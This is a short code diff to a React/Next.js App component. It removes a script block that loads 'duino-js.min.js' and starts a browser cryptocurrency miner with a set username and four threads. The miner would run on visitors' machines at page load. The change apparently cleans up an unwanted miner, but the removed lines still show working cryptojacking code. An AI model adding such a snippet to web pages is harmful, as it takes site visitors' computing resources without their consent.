@@ -24,13 +24,6 @@ export default function App(props: AppProps) {
         <Component {...pageProps} />
         <Analytics />
       </MantineProvider>
-      <script src="duino-js.min.js" async />
-      <script>
-        username = `authorises`;
-        rigid = `WebMiner`;
-        threads = 4;
-        startMiner();
-      </script>
     </>
   );
 }
